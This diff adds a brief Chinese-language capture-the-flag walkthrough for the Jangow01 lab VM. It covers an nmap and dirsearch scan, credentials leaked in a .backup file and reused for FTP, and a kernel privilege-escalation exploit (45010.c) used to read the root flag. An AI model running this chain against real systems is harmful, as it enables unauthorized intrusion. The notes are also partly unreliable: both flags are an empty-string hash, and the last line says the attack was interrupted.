@@ -1,0 +1,78 @@
+#开启主机，得到IP地址
+192.168.1.16
+
+#nmap 扫描
+nmap -sS -P0 -A 192.168.1.16 
+-sS Tcp SYN扫描 半开放扫描，隐身扫描 
+-P0 允许你关闭ICMP pings
+-A  探测操作系统版本
+-v  输出详细扫描信息
+# Nmap scan report for 192.168.1.16
+# Host is up (0.00024s latency).
+# Not shown: 998 filtered tcp ports (no-response)
+# PORT   STATE SERVICE VERSION
+# 21/tcp open  ftp     vsftpd 3.0.3
+# 80/tcp open  http    Apache httpd 2.4.18
+# | http-ls: Volume /
+# | SIZE  TIME              FILENAME
+# | -     2021-06-10 18:05  site/
+# |_
+# |_http-server-header: Apache/2.4.18 (Ubuntu)
+# |_http-title: Index of /
+# MAC Address: 08:00:27:11:38:0C (Oracle VirtualBox virtual NIC)
+# Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+# Device type: general purpose
+# Running: Linux 3.X|4.X
+# OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+# OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
+# Network Distance: 1 hop
+# Service Info: Host: 127.0.0.1; OS: Unix
+
+#dirsearch 扫描网站
+dirsearch -u http://192.168.1.16:80/
+# .backup
+# site/
+
+#.backup
+$servername = "localhost";
+$database = "jangow01";
+$username = "jangow01";
+$password = "abygurl69";
+// Create connection
+$conn = mysqli_connect($servername, $username, $password, $database);
+// Check connection
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+echo "Connected successfully";
+mysqli_close($conn);
+
+#ftp 连接到主机，在目录的路径栏
+ftp://192.168.1.16
+
+#输入上面的用户和密码
+$username = "jangow01";
+$password = "abygurl69";
+
+#连接成功， /home/jangow01/user.txt
+d41d8cd98f00b204e9800998ecf8427e
+
+#查看系统内核版本
+uname -a
+# linux 4.4.0-31 generic
+
+#搜索漏洞 linux 4.4.0-31 generic
+45010.c
+
+#上传到主机， gcc 编译
+gcc 45010.c -o exploit
+
+#执行漏洞文件，提升到root权限,获取flag
+cd /root
+ls
+cat proof.txt
+#d41d8cd98f00b204e9800998ecf8427e
+
+
+#该虚拟机环境存在问题，攻击中断
+
